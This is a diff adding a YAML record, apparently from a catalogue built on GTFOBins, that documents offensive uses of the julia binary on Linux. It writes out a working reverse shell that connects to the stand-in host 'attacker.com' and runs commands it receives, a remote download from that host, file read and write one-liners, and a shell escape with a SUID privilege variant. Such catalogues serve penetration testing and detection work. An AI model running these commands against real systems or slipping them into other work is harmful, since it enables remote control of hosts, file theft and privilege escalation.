@@ -1,0 +1,110 @@
+id: gtfobins/julia/reverse-shell/unprivileged
+type: binary
+platform: linux
+name: julia
+phases:
+- execution
+- command-and-control
+capabilities:
+- reverse-shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd
+    = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`,
+    stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
+references:
+- https://gtfobins.github.io/gtfobins/julia/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        julia:
+          functions:
+            download:
+            - code: julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: http-server
+            file-read:
+            - code: julia -e 'print(open(f->read(f, String), "/path/to/input-file"))'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: julia -e 'open(f->write(f, "DATA"), /path/to/output-file, "w")'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            reverse-shell:
+            - code: julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while
+                true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe
+                = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo))
+                * String(take!(ioe))); end; end;'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              listener: tcp-server
+            shell:
+            - code: julia -e 'run(`/bin/sh`)'
+              contexts:
+                sudo: null
+                suid:
+                  code: julia -e 'run(`/bin/sh -p`)'
+                  shell: false
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/julia/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: reverse-shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:032c263071a408c0effe2d85763870e2a5c7117c7c297365a02144d92701ffdf
